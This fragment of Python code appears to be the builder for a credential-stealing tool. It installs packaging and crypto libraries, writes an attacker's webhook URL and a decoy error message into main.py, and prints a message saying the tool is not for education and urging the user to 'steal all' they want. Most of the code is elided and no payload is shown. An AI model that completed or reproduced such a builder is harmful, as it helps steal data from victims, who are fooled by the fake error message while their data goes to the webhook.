...
def install_requirements():
    ...
    packages = ["pyinstaller", "pillow", "requests", "pywin32", "cryptography", "psutil"]
...
def modify_main_py(webhook_url, error_message):
...
def main():
    ...
    modified_file = modify_main_py(webhook_url, error_message)
    ...
    if success:
        ...
        print("[!] Remember: This tool is NOT for educational purposes. Steal all the shit you want")
    else:
